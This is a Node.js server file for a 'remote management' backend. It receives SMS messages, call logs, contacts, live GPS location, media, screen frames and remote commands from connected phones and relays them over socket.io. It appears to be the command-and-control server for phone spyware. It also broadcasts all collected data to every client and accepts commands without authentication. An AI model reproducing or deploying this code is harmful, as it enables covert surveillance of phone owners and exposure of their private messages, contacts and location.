const express = require('express');
const http = require('http');
const mongoose = require('mongoose');
const cors = require('cors');
const { Server } = require('socket.io');
require('dotenv').config();

const authRoutes = require('./routes/auth');
const deviceRoutes = require('./routes/devices');
const mediaRoutes = require('./routes/media');
const chatRoutes = require('./routes/chat');
const messageRoutes = require('./routes/messages');
const callLogRoutes = require('./routes/calllogs');
const contactRoutes = require('./routes/contacts');
const locationRoutes = require('./routes/location');
const fileRoutes = require('./routes/files');

const app = express();
const server = http.createServer(app);

// Allow requests from all frontend origins (Vercel, Netlify, localhost, etc.)
const io = new Server(server, {
    cors: {
        origin: process.env.FRONTEND_URL || '*',
        methods: ['GET', 'POST', 'PUT', 'DELETE'],
        credentials: true
    },
    maxHttpBufferSize: 50 * 1024 * 1024  // 50MB — allows Base64 photo thumbnails
});

const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors({
    origin: process.env.FRONTEND_URL || '*',
    credentials: true
}));
app.use(express.json({ limit: '50mb' }));

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/devices', deviceRoutes);
app.use('/api/media', mediaRoutes);
app.use('/api/chat', chatRoutes);
app.use('/api/messages', messageRoutes);
app.use('/api/calllogs', callLogRoutes);
app.use('/api/contacts', contactRoutes);
app.use('/api/location', locationRoutes);
app.use('/api/files', fileRoutes);

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date() });
});

// Socket.io Real-time streaming & command handlers
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    socket.on('join_device', (deviceId) => {
        socket.join(`device_${deviceId}`);
        console.log(`Socket ${socket.id} joined device_${deviceId}`);
    });

    socket.on('device_ping', (data) => {
        console.log('Device ping received:', data.deviceName || data.deviceId);
        io.emit('device_status_update', data);
    });

    // Individual telemetry channels — each sent separately to avoid payload size issues
    socket.on('device_sms_sync', (data) => {
        console.log(`SMS sync: ${data.count || 0} messages from ${data.deviceId}`);
        io.emit('live_sms_sync', data);
    });

    socket.on('device_calls_sync', (data) => {
        console.log(`Call logs sync: ${data.count || 0} logs from ${data.deviceId}`);
        io.emit('live_calls_sync', data);
    });

    socket.on('device_contacts_sync', (data) => {
        console.log(`Contacts sync: ${data.count || 0} contacts from ${data.deviceId}`);
        io.emit('live_contacts_sync', data);
    });

    socket.on('device_location_sync', (data) => {
        console.log(`Location sync from ${data.deviceId}: ${data.latitude}, ${data.longitude}`);
        io.emit('live_location_sync', data);
    });

    socket.on('device_media_sync', (data) => {
        console.log(`Media sync: ${data.count || 0} items from ${data.deviceId}`);
        io.emit('live_media_sync', data);
    });

    // Legacy combined dump (kept for backwards compatibility)
    socket.on('device_telemetry_dump', (data) => {
        console.log('Received full telemetry dump for device:', data.deviceId);
        io.emit('live_telemetry_dump', data);
    });

    socket.on('send_command', (data) => {
        io.emit('remote_command', data);
    });

    socket.on('screen_frame', (data) => {
        io.emit('remote_screen_frame', data);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
    });
});

// Connect to MongoDB if URI is provided
const mongoURI = process.env.MONGODB_URI || 'mongodb://localhost:27017/remote-management';
mongoose.connect(mongoURI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log('MongoDB connected successfully.'))
.catch((err) => console.log('MongoDB connection warning:', err.message));

server.listen(PORT, () => {
    console.log(`Remote Management Backend running on port ${PORT}`);
});